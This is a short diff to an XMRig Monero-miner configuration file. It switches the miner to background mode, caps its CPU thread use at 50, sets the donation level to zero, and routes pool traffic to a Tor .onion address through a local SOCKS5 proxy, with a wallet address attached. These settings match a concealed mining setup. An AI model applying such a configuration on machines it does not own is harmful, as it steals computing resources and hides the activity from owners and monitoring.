@@ -11,7 +11,7 @@
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "randomx": {
@@ -30,7 +30,8 @@
         "huge-pages": true,
         "huge-pages-jit": false,
         "hw-aes": null,
-        "priority": null,
+        "priority": 0,
+        "max-threads-hint": 50,
         "memory-pool": false,
         "yield": true,
         "asm": true,
@@ -159,13 +160,13 @@
         "cn/0": false
     },
     "log-file": "xmrig.log",
-    "donate-level": 1,
+    "donate-level": 0,
     "donate-over-proxy": 0,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "10.24.24.22:3333",
+            "url": "gatpmfhvakvbn7ia4j4k3xn7xoprsakiraczzpooppergx4jvp6qleid.onion:3333",
             "user": "84r88nrrJXzConW7WMzLTKcFuWb53chyaBBERG9BNrCqdJJByKYadRWZtCB7ofqCKKUR88mXRW99gFZE7LX1morR4F1e6q3",
             "pass": "x",
             "rig-id": null,
@@ -176,7 +177,7 @@
             "sni": false,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": null,
+            "socks5": "127.0.0.1:9050",
             "self-select": null,
             "submit-to-origin": false
         }
